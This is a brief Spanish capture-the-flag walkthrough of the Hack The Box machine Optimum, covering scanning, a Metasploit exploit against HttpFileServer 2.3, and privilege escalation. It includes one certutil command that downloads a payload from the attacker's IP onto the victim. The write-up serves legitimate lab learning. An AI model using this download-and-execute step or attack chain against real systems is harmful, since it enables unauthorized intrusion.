___
# Optimum Machine (Hack The Box)

IP atacante: 10.10.17.214
IP víctima: 10.129.72.32

Comprobamos conectividad con la máquina

![[optimum_ping.png]]

TLL = 127 -> Máquina Windows

___

# RECONOCIMIENTO Y ENUMERACIÓN

Realizamos un nmap para escanear puertos y ver cuáles están abiertos.

![[optimum_nmap.png]]

[+] Puertos abiertos
	-> 80 | http | HttpFileServer httpd 2.3

Al ir a la página web, nos encontramos con lo siguiente

![[optimum_80.png]]

Podemos obtener información sobre el servicio que se está utilizando: `HttpFileServer 2.3`

Asi que procedemos a buscar un exploit para dicha versión con `serachsploit`

![[optimum_searchsploit.png]]

Ejecutamos metasploit para explotar la vulnerabilidad y lograr una consola vía RCE.

![[optimum_metasploit.png]]

Lanzamos el exploit y obtenemos la flag del user.

![[optimum_flaguser.png]]

# ESCALADA DE PRIVILEGIOS

Usando `windows-exploit-suggester` encontramos el siguiente exploit para escalar privilegios

![[optimum_exploit.png]]

Nos traemos ese archivo a la máquina víctima par ejecutarla allí.

```bash
certutil.exe -f -urlcache -split http://10.10.17.214/recurso recurso
```

![[optimum_exe.png]]

Ejecutamos el script y obtenemos la flag del root.

![[optimum_flagroot.png]]

